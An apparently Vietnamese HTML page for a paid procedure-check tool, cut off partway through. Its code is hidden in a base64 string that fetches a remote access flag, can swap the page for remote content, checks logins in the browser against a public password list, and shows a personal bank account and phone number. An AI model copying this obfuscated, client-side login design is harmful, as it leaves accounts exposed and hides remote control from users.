<!-- 

///////////////////////////////////////////////
/////Code được viết bởi Chauhuynh0104/////////
////http://fb.com/chauhuynh0104//////////////
/////////////079.567.9350///////////////////
///Vui lòng tôn trọng bản quyền tác giả////
/////////Không xoá dòng này //////////////
/////////////////////////////////////////

!-->
<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><title>Thủ Thuật</title></head>
<body>
<script>
  const base64 = "PCEtLSANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy9Db2RlIMSRxrDhu6NjIHZp4bq/dCBi4bufaSBDaGF1aHV5bmgwMTA0Ly8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vL2h0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzA3OS41NjcuOTM1MC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy9WdWkgbMOybmcgdMO0biB0cuG7jW5nIGLhuqNuIHF1eeG7gW4gdMOhYyBnaeG6oy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy9LaMO0bmcgeG/DoSBkw7JuZyBuw6B5IC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIS0tPg0KPCFET0NUWVBFIGh0bWw+DQoNCjxodG1sIGxhbmc9InZpIj4NCjxoZWFkPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjp3Z2h0QDQwMDs2MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIvPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ii8+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPg0KPG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgbmFtZT0idmlld3BvcnQiLz4NCjx0aXRsZT5LaeG7g20gVHJhIFRo4bunIFRodeG6rXQ8L3RpdGxlPg0KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NoYXVodXluaDAxMDQuZ2l0aHViLmlvL2d5bS9naWFvZGllbi5jc3MiPg0KPCEtLSBFbWFpbEpTIFNESyAtLT4NCjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL0BlbWFpbGpzL2Jyb3dzZXJANC9kaXN0L2VtYWlsLm1pbi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICAoZnVuY3Rpb24oKXsNCiAgICBlbWFpbGpzLmluaXQoIi1ZRkZtSEpQOXpVSmFucXVLIik7IC8vIPCfkYggdGhheSBi4bqxbmcgUHVibGljIEtleSBj4bunYSBi4bqhbg0KICB9KSgpOw0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICAgYXN5bmMgZnVuY3Rpb24gY2hlY2tBY2Nlc3MoKSB7DQogICAgY29uc3QganNvblVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vZHJjaGF1Lmpzb24nOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKGpzb25VcmwpOw0KICAgICAgICBpZiAoIXJlcy5vaykgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgdGjhu4MgdOG6o2kgZmlsZSBKU09OJyk7DQogICAgICAgIGNvbnN0IGNvbmZpZyA9IGF3YWl0IHJlcy5qc29uKCk7DQoNCiAgICAgICAgaWYgKCFjb25maWcuQUNDRVNTX0FMTE9XRUQpIHsNCiAgICAgICAgICAgIC8vIFThuqNpIHRyYW5nIEhUTUwgdGhheSB0aOG6vw0KICAgICAgICAgICAgY29uc3QgaHRtbFJlcyA9IGF3YWl0IGZldGNoKCdodHRwczovL2NoYXVodXluaDAxMDQuZ2l0aHViLmlvL2JhY3NpY2hhdS9iYW90cmkuaHRtbCcpOw0KICAgICAgICAgICAgY29uc3QgaHRtbENvbnRlbnQgPSBhd2FpdCBodG1sUmVzLnRleHQoKTsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gaHRtbENvbnRlbnQ7DQoNCiAgICAgICAgICAgIC8vIE7hur91IGPDsyBSRURJUkVDVF9VUkwgdGjDrCB0aOG7sWMgaGnhu4duIGNodXnhu4NuIGjGsOG7m25nIHNhdSA1IGdpw6J5DQogICAgICAgICAgICBpZiAoY29uZmlnLlJFRElSRUNUX1VSTCkgew0KICAgICAgICAgICAgICAgIGxldCBzZWNvbmRzID0gNTsNCiAgICAgICAgICAgICAgICBjb25zdCB0aW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICAgICAgICAgICAgICAgICAgc2Vjb25kcy0tOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBjb3VudGRvd25FbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3VudGRvd24nKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50ZG93bkVsKSBjb3VudGRvd25FbC5pbm5lclRleHQgPSBzZWNvbmRzOw0KICAgICAgICAgICAgICAgICAgICBpZiAoc2Vjb25kcyA8PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKHRpbWVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gY29uZmlnLlJFRElSRUNUX1VSTDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0sIDEwMDApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9IGA8ZGl2IHN0eWxlPSdwYWRkaW5nOjUwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkJz4NCiAgICAgICAgICAgIDxoMj5LSMOUTkcgVOG6okkgxJDGr+G7okMgQ+G6pFUgSMOMTkg8L2gyPjxwPkzhu5dpIHRydXkgY+G6rXAga2hpIGvhur90IG7hu5FpIG3huqFuZy48YnIvPiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSDEkcaw4budbmcgdHJ1eeG7gW4gaW50ZXJuZXQuPC9wPg0KICAgICAgICA8L2Rpdj5gOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KfQ0KICAgIGFzeW5jIGZ1bmN0aW9uIGxvYWRBY2NvdW50c0Zyb21UWFQoKSB7DQogICAgICAgIGNvbnN0IHR4dFVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vdGtrLnR4dCc7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHR4dFVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBhY2NvdW50cyA9IHt9Ow0KICAgICAgICB0ZXh0LnNwbGl0KCdcbicpLmZvckVhY2gobGluZSA9PiB7DQogICAgICAgICAgICBjb25zdCBbdSwgcF0gPSBsaW5lLnRyaW0oKS5zcGxpdCgnOicpOw0KICAgICAgICAgICAgaWYgKHUgJiYgcCkgYWNjb3VudHNbdV0gPSBwOw0KICAgICAgICB9KTsNCiAgICAgICAgcmV0dXJuIGFjY291bnRzOw0KICAgIH0NCiAgICBhc3luYyBmdW5jdGlvbiBlbmFibGVMb2dpbihhY2NvdW50cykgew0KICAgICAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKTsNCiAgICAgICAgY29uc3QgdXNlcklucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKTsNCiAgICAgICAgY29uc3QgcGFzc0lucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKTsNCiAgICAgICAgY29uc3QgZXJyb3JEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpOw0KDQogICAgICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHVzZXIgPSB1c2VySW5wdXQudmFsdWUudHJpbSgpOw0KICAgICAgICAgICAgY29uc3QgcGFzcyA9IHBhc3NJbnB1dC52YWx1ZS50cmltKCk7DQogICAgICAgICAgICBpZiAoYWNjb3VudHNbdXNlcl0gJiYgYWNjb3VudHNbdXNlcl0gPT09IHBhc3MpIHsNCiAgICAgICAgICAgICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcik7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QucmVtb3ZlKCdsb2dpbi1wYWdlJyk7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICAgICAgZXJyb3JEaXYuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgZXJyb3JEaXYuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICB9DQogICAgICAgIH0pOw0KICAgIH0NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsNCiAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gZHJvcGRvd24gbOG7jWMgbcOheQ0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lT3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJNYWNoaW5lRXJyb3JzQnlPcGVyYXRvcik7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdE9wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyTWFjaGluZUNvbmZsaWN0c0J5T3BlcmF0b3IpOw0KCSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVPcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlck1pc3NpbmdNYWNoaW5lQnlPcGVyYXRvcik7DQoJIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckRhdGVNaXNtYXRjaEJ5T3BlcmF0b3IpOw0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgaWYgKGFsbFByb2NlZHVyZXMubGVuZ3RoID4gMCkgew0KICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KICAgIH0NCn0pOw0KfSk7DQoNCiB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGFzeW5jICgpID0+IHsNCiAgY29uc3QgYWxsb3cgPSBhd2FpdCBjaGVja0FjY2VzcygpOw0KICBpZiAoIWFsbG93KSByZXR1cm47DQogIC8vIENo4buJIGtp4buDbSB0cmEgxJHEg25nIG5o4bqtcCDEkcOjIGzGsHU7IEtIw5RORyB04bqjaSBydWxlL3Byb2NlZHVyZXMg4bufIMSRw6J5DQogIGNoZWNrU2F2ZWRMb2dpbigpOw0KfSk7DQoNCjwvc2NyaXB0Pg0KDQo8L2hlYWQ+DQo8Ym9keT4NCg0KPCEtLSBUSEVNRSBQSUNLRVIgLS0+DQo8ZGl2IGlkPSJ0aGVtZVBpY2tlciIgY2xhc3M9InRoZW1lLXBpY2tlciIgdGl0bGU9IkNo4buNbiBtw6B1IGNo4bunIMSR4buBIGdpYW8gZGnhu4duIj4NCiANCiANCiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ0aGVtZS1zd2F0Y2giIGRhdGEtdGhlbWU9ImRlZmF1bHQiIHN0eWxlPSItLXN3YXRjaDojMzQ5OGRiIiBhcmlhLWxhYmVsPSJN4bq3YyDEkeG7i25oIChYYW5oIGTGsMahbmcpIj48L2J1dHRvbj4NCiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ0aGVtZS1zd2F0Y2giIGRhdGEtdGhlbWU9Im9yYW5nZSIgIHN0eWxlPSItLXN3YXRjaDojRkY2NjAwIiBhcmlhLWxhYmVsPSJNw6B1IGNhbSI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJyZWQiICAgICBzdHlsZT0iLS1zd2F0Y2g6I0ZGMDAwMCIgYXJpYS1sYWJlbD0iTcOgdSDEkeG7jyI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJncmVlbiIgICBzdHlsZT0iLS1zd2F0Y2g6IzAwQUEwMCIgYXJpYS1sYWJlbD0iTcOgdSB4YW5oIGzDoSI+PC9idXR0b24+DQogICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgaWQ9ImRhcmtUb2dnbGUiIGNsYXNzPSJ0aGVtZS1kYXJrLXRvZ2dsZSIgb25jbGljaz0idG9nZ2xlRGFya01vZGUoKSIgYXJpYS1sYWJlbD0iQuG6rXQvVOG6r3QgY2jhur8gxJHhu5kgdOG7kWkiPg0KICAgIDxzcGFuIGlkPSJkYXJrSWNvbiI+PHNtYWxsPvCfjJk8L3NtYWxsPjwvc3Bhbj4gPHNwYW4gaWQ9ImRhcmtUZXh0Ij5U4buRaTwvc3Bhbj4NCiAgPC9idXR0b24+DQogIA0KPC9kaXY+DQoNCg0KDQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiB0b2dnbGVEYXJrTW9kZSgpIHsNCiAgICBjb25zdCBib2R5ID0gZG9jdW1lbnQuYm9keTsNCiAgICBjb25zdCBpY29uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRhcmtJY29uIik7DQogICAgY29uc3QgdGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkYXJrVGV4dCIpOw0KICAgIA0KICAgIGJvZHkuY2xhc3NMaXN0LnRvZ2dsZSgiZGFyay1tb2RlIik7DQogICAgY29uc3QgaXNEYXJrID0gYm9keS5jbGFzc0xpc3QuY29udGFpbnMoImRhcmstbW9kZSIpOw0KICAgIA0KICAgIGljb24udGV4dENvbnRlbnQgPSBpc0RhcmsgPyAi4piA77iPIiA6ICLwn4yZIjsNCiAgICB0ZXh0LnRleHRDb250ZW50ID0gaXNEYXJrID8gIlPDoW5nIiA6ICJU4buRaSI7DQogICAgDQogICAgLy8gTMawdSB0cuG6oW5nIHRow6FpIHbDoG8gbG9jYWxTdG9yYWdlDQogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ2RhcmtNb2RlJywgaXNEYXJrID8gJ2VuYWJsZWQnIDogJ2Rpc2FibGVkJyk7DQp9DQpmdW5jdGlvbiBsb2FkRGFya01vZGVQcmVmZXJlbmNlKCkgew0KICAgIGNvbnN0IGRhcmtNb2RlID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2RhcmtNb2RlJyk7DQogICAgY29uc3QgYm9keSA9IGRvY3VtZW50LmJvZHk7DQogICAgY29uc3QgaWNvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkYXJrSWNvbiIpOw0KICAgIGNvbnN0IHRleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGFya1RleHQiKTsNCiAgICANCiAgICBpZiAoZGFya01vZGUgPT09ICdlbmFibGVkJykgew0KICAgICAgICBib2R5LmNsYXNzTGlzdC5hZGQoImRhcmstbW9kZSIpOw0KICAgICAgICBpY29uLnRleHRDb250ZW50ID0gIuKYgO+4jyI7DQogICAgICAgIHRleHQudGV4dENvbnRlbnQgPSAiU8OhbmciOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGJvZHkuY2xhc3NMaXN0LnJlbW92ZSgiZGFyay1tb2RlIik7DQogICAgICAgIGljb24udGV4dENvbnRlbnQgPSAi8J+MmSI7DQogICAgICAgIHRleHQudGV4dENvbnRlbnQgPSAiVOG7kWkiOw0KICAgIH0NCn0NCiAgICA8L3NjcmlwdD4NCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KLy8gTOG6pXkgY8OhYyBwaOG6p24gdOG7rQ0KICAgICAgICAgICAgY29uc3QgdHJpZ2dlckJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlnZ2VyQnV0dG9uJyk7DQogICAgICAgICAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQoNCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIHBo4bqnbiB04butIGPDsyB04buTbiB04bqhaSBraMO0bmcNCiAgICAgICAgICAgIGlmICghdHJpZ2dlckJ1dHRvbiB8fCAhZmlsZUlucHV0KSB7DQogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2k6IEtow7RuZyB0w6xtIHRo4bqleSB0cmlnZ2VyQnV0dG9uIGhv4bq3YyBmaWxlSW5wdXQnKTsNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFRow6ptIHPhu7Ega2nhu4duIGNsaWNrIGNobyBidXR0b24NCiAgICAgICAgICAgIHRyaWdnZXJCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICAgICAgZmlsZUlucHV0LmNsaWNrKCk7IC8vIEvDrWNoIGhv4bqhdCBpbnB1dCBmaWxlDQogICAgICAgICAgICB9KTsNCg0KICAgICAgICB9KTsNCg0KPC9zY3JpcHQ+DQoNCg0KDQoNCg0KPCEtLSBQT1BVUCBNVUEgQuG6ok4gUVVZ4buATiAtLT4NCjxkaXYgaWQ9ImJ1eVBvcHVwIiBjbGFzcz0icG9wdXAtb3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPg0KICA8ZGl2IGNsYXNzPSJwb3B1cC1jb250ZW50IGx1eHVyeSI+DQogICAgPGgyIGNsYXNzPSJwb3B1cC10aXRsZSI+QuG6ok5HIEdJw4EgQuG6ok4gUVVZ4buATjwvaDI+DQogICAgPGRpdiBjbGFzcz0icHJpY2luZy1ncmlkIj4NCiAgICAgIDxkaXYgY2xhc3M9InByaWNlLWNhcmQiPg0KICAgICAgICA8aDM+MSBUaMOhbmc8L2gzPg0KICAgICAgICA8cCBjbGFzcz0icHJpY2UiPjEuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnMSBUaMOhbmcnLCAnMS4wMDAuMDAwIFZOxJAnKSI+TXVhIG5nYXk8L2J1dHRvbj4NCiAgICAgIDwvZGl2Pg0KICAgICAgPGRpdiBjbGFzcz0icHJpY2UtY2FyZCI+DQogICAgICAgIDxoMz42IFRow6FuZzwvaDM+DQogICAgICAgIDxwIGNsYXNzPSJwcmljZSI+NS4wMDAuMDAwIFZOxJA8L3A+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ1eS1idG4iIG9uY2xpY2s9Im9wZW5QYXltZW50KCc2IFRow6FuZycsICc1LjAwMC4wMDAgVk7EkCcpIj5NdWEgbmdheTwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgICA8ZGl2IGNsYXNzPSJwcmljZS1jYXJkIj4NCiAgICAgICAgPGgzPjEgTsSDbTwvaDM+DQogICAgICAgIDxwIGNsYXNzPSJwcmljZSI+MTAuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnMSBOxINtJywgJzEwLjAwMC4wMDAgVk7EkCcpIj5NdWEgbmdheTwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgICA8ZGl2IGNsYXNzPSJwcmljZS1jYXJkIj4NCiAgICAgICAgPGgzPjUgTsSDbTwvaDM+DQogICAgICAgIDxwIGNsYXNzPSJwcmljZSI+NDAuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnNSBOxINtJywgJzQwLjAwMC4wMDAgVk7EkCcpIj5NdWEgbmdheTwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGJ1dHRvbiBjbGFzcz0iY2xvc2UtYnRuIiBvbmNsaWNrPSJjbG9zZUJ1eVBvcHVwKCkiPsSQw7NuZzwvYnV0dG9uPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQo8IS0tIFBPUFVQIFRIQU5IIFRPw4FOIC0tPg0KPGRpdiBpZD0icGF5bWVudFBvcHVwIiBjbGFzcz0icG9wdXAtb3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPg0KICA8ZGl2IGNsYXNzPSJwb3B1cC1jb250ZW50IGZvcm0tcG9wdXAiPg0KICAgIDxoMj5Yw4FDIE5I4bqsTiBUSEFOSCBUT8OBTjwvaDI+PGJyLz4NCgk8bGFiZWw+PGZvbnQgY29sb3I9InJlZCI+PGI+VnVpIGzDsm5nIHRoYW5oIHRvw6FuIHRyxrDhu5tjIHbDoCDEkeG7o2kgYuG7mSBwaOG6rW4ga+G7uSB0aHXhuq10IGxpw6puIGjhu4c8L2I+PC9mb250PjwvbGFiZWw+PGJyLz48YnIvPg0KICAgIDxmb3JtIGlkPSJwYXltZW50Rm9ybSI+DQogICAgICA8bGFiZWw+U+G7kSB0w6BpIGtob+G6o24gdGjhu6UgaMaw4bufbmc6IDxiPjE3OTU2NzkzNTA8L2I+PC9sYWJlbD48YnIvPg0KCSAgIDxsYWJlbD5Uw6puIHTDoGkga2hv4bqjbjogPGI+SHXhu7NuaCBOZ+G7jWMgQ2jDonU8L2I+PC9sYWJlbD48YnIvPg0KICAgICAgPGxhYmVsPk5nw6JuIGjDoG5nOiA8Yj5WaWV0Y29tYmFuazwvYj48L2xhYmVsPjxici8+PGJyLz4NCiAgICAgIDxsYWJlbD5T4buRIHRp4buBbiBj4bqnbiB0aGFuaCB0b8Ohbjo8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJtb25leSIgcmVhZG9ubHk+PGJyLz4NCiAgICAgPGxhYmVsPlPhu5EgdMOgaSBraG/huqNuIG5nxrDhu51pIG11YTo8L2xhYmVsPg0KPGlucHV0IHR5cGU9InRleHQiIGlkPSJidXllckFjYyIgcmVxdWlyZWQ+PGJyLz4NCg0KPGxhYmVsPk5nw6JuIGjDoG5nIG5nxrDhu51pIG11YTo8L2xhYmVsPg0KPHNlbGVjdCBpZD0iYnV5ZXJCYW5rIiByZXF1aXJlZD4NCiAgPG9wdGlvbiB2YWx1ZT0iIj4tLSBDaOG7jW4gbmfDom4gaMOgbmcgLS08L29wdGlvbj4NCiAgPG9wdGlvbj5BZ3JpYmFuayAtIE5nw6JuIGjDoG5nIE7DtG5nIG5naGnhu4dwICYgUFROVCBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+VmlldGNvbWJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIE5nb+G6oWkgdGjGsMahbmcgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRpbkJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIEPDtG5nIFRoxrDGoW5nIFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5CSURWIC0gTmfDom4gaMOgbmcgVE1DUCDEkOG6p3UgdMawIHbDoCBQaMOhdCB0cmnhu4NuIFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5BQ0IgLSBOZ8OibiBow6BuZyDDgSBDaMOidTwvb3B0aW9uPg0KICA8b3B0aW9uPlNhY29tYmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuIFRoxrDGoW5nIFTDrW48L29wdGlvbj4NCiAgPG9wdGlvbj5UZWNoY29tYmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgS+G7uSB0aMawxqFuZyBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+TUJCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBRdcOibiDEkeG7mWk8L29wdGlvbj4NCiAgPG9wdGlvbj5UUEJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFRpw6puIFBob25nPC9vcHRpb24+DQogIDxvcHRpb24+VlBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBWaeG7h3QgTmFtIFRo4buLbmggVsaw4bujbmc8L29wdGlvbj4NCiAgPG9wdGlvbj5IREJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFBow6F0IHRyaeG7g24gVFAgSOG7kyBDaMOtIE1pbmg8L29wdGlvbj4NCiAgPG9wdGlvbj5FeGltYmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgWHXhuqV0IE5o4bqtcCBraOG6qXUgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlNIQiAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuIC0gSMOgIE7hu5lpPC9vcHRpb24+DQogIDxvcHRpb24+U2VBQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgxJDDtG5nIE5hbSDDgTwvb3B0aW9uPg0KICA8b3B0aW9uPlNDQiAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuPC9vcHRpb24+DQogIDxvcHRpb24+T0NCIC0gTmfDom4gaMOgbmcgVE1DUCBQaMawxqFuZyDEkMO0bmc8L29wdGlvbj4NCiAgPG9wdGlvbj5WSUIgLSBOZ8OibiBow6BuZyBUTUNQIFF14buRYyB04bq/IFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5QVmNvbUJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIMSQ4bqhaSBDaMO6bmcgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPk5hbUFCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBOYW0gw4E8L29wdGlvbj4NCiAgPG9wdGlvbj5PY2VhbkJhbmsgLSBOZ8OibiBow6BuZyBUTSBUTkhIIE1UViDEkOG6oWkgRMawxqFuZzwvb3B0aW9uPg0KICA8b3B0aW9uPkJhY0FCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBC4bqvYyDDgTwvb3B0aW9uPg0KICA8b3B0aW9uPkFCQkFOSyAtIE5nw6JuIGjDoG5nIFRNQ1AgQW4gQsOsbmg8L29wdGlvbj4NCiAgPG9wdGlvbj5C4bqjbyBWaeG7h3QgQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgQuG6o28gVmnhu4d0PC9vcHRpb24+DQogIDxvcHRpb24+S2nDq